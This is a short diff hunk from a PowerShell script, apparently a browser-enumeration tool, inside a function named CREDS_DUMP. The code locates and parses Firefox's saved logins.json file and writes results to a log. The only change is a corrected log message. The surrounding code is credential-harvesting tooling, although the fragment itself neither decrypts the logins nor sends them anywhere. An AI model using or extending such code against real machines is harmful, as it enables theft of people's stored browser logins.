@@ -630,7 +630,7 @@ function CREDS_DUMP {
     If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json")){
         $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
         If(-not(Test-Path "$Bookmarks_Path")){
-            echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
+            echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
         }else{
             $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
             $Json = Get-Content "$Bookmarks_Path"|ConvertFrom-Json|select *
